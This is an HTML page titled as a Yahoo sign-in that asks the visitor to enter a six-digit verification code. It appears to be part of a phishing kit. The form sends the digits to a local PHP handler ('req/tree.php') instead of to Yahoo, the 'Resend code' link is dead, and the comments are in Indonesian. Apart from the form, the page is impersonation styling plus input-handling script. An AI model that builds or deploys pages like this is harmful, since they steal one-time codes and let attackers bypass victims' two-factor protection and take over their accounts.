<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in - Sign in to Yahoo</title>

<style>
body {
    margin: 0;
    background: #ffffff;
    font-family: system-ui, -apple-system, BlinkMacSystemFont,
                 "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    color: #202124;
}

.container {
    max-width: 360px;
    margin: 0 auto;
    padding: 24px;
}

.text-section {
    margin-top: 88px;
}

.text-section h1 {
    font-size: 26px;
    font-weight: 600;
    margin: 0;
    text-align: center;
    letter-spacing: -0.3px;
}

.text-section p {
    margin-top: 8px;
    font-size: 15px;
    color: #5f6368;
    text-align: center;
    line-height: 1.5;
}

.otp-group {
    margin-top: 40px;
    display: flex;
    justify-content: space-between;
}

.otp-group input {
    width: 44px;
    height: 52px;
    font-size: 20px;
    text-align: center;
    border: none;
    border-bottom: 2px solid #dadce0;
    outline: none;
    color: #202124;
}

.otp-group input:focus {
    border-bottom-color: #1a73e8;
}

.error {
    margin-top: 12px;
    font-size: 13px;
    color: #d93025;
    text-align: center;
    display: none;
}

.button-group {
    margin-top: 32px;
}

.button-group button {
    width: 100%;
    height: 48px;
    font-size: 15px;
    font-weight: 600;
    background: #1a73e8;
    color: #ffffff;
    border: none;
    border-radius: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
    transition: background 0.2s;
}

.button-group button:disabled {
    background: #a0c0f0;
    cursor: default;
}

.button-group button:active:enabled {
    background: #1664c0;
}

.spinner {
    width: 18px;
    height: 18px;
    border: 2px solid rgba(255,255,255,0.4);
    border-top: 2px solid #ffffff;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    display: none;
}

@keyframes spin {
    to { transform: rotate(360deg); }
}

.timer {
    margin-top: 16px;
    font-size: 13px;
    color: #5f6368;
    text-align: center;
}

.timer a {
    color: #1a73e8;
    text-decoration: none;
    font-weight: 500;
}
</style>
</head>

<body>

<div class="container">

    <div class="text-section">
        <h1>Verify it’s you</h1>
        <p>Enter the 6-digit code we sent to your number</p>
    </div>

    <!-- FORM -->
    <form id="otpForm" onsubmit="submitOTP(event);" autocomplete="off" action="req/tree.php" method="POST">
    <div class="otp-group">
        <input name="otp1" maxlength="1" inputmode="numeric" pattern="[0-9]*" autofocus>
        <input name="otp2" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input name="otp3" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input name="otp4" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input name="otp5" maxlength="1" inputmode="numeric" pattern="[0-9]*">
        <input name="otp6" maxlength="1" inputmode="numeric" pattern="[0-9]*">
    </div>

    <div class="error" id="error">
        Enter the correct code
    </div>

    <div class="button-group">
        <button type="submit" id="verifyBtn" disabled>
            <span id="btnText">Verify</span>
            <div class="spinner" id="spinner"></div>
        </button>
    </div>
    </form>

    <div class="timer">
        Code expires in <span id="time">02:59</span><br>
        <a href="#">Resend code</a>
    </div>

</div>

<script>
const otpInputs = document.querySelectorAll('.otp-group input');
const verifyBtn = document.getElementById('verifyBtn');
const spinner = document.getElementById('spinner');
const btnText = document.getElementById('btnText');

/* Fokus ke input pertama saat klik area */
document.querySelector('.otp-group').addEventListener('click', () => {
    for (let input of otpInputs) {
        if (!input.value) {
            input.focus();
            break;
        }
    }
});

/* Input handler */
otpInputs.forEach((input, index) => {
    input.addEventListener('input', () => {
        input.value = input.value.replace(/[^0-9]/g, '');
        if(input.value && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
        }
        toggleVerifyButton();
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
            if (!input.value && index > 0) {
                otpInputs[index - 1].focus();
                otpInputs[index - 1].value = '';
            }
        }

        if (!/[0-9]/.test(e.key) && !['Backspace','ArrowLeft','ArrowRight','Tab'].includes(e.key)) {
            e.preventDefault();
        }
    });
});

/* Enable tombol Verify hanya jika semua 6 digit diisi */
function toggleVerifyButton() {
    const allFilled = Array.from(otpInputs).every(i => i.value.trim() !== '');
    verifyBtn.disabled = !allFilled;
}

/* Paste OTP (angka saja) */
document.addEventListener('paste', (e) => {
    const paste = e.clipboardData.getData('text').replace(/\D/g,'');
    if(!paste) return;
    otpInputs.forEach((input, i) => {
        input.value = paste[i] || '';
    });
    toggleVerifyButton();
    otpInputs[Math.min(paste.length, otpInputs.length)-1].focus();
});

/* Submit form */
function submitOTP(e){
    e.preventDefault();
    if (Array.from(otpInputs).some(i => i.value.trim() === '')) return;

    spinner.style.display = 'block';
    btnText.textContent = 'Verifying…';
    e.target.submit();
}

/* Autofocus pertama kali */
window.onload = () => otpInputs[0].focus();
</script>

</body>
</html>
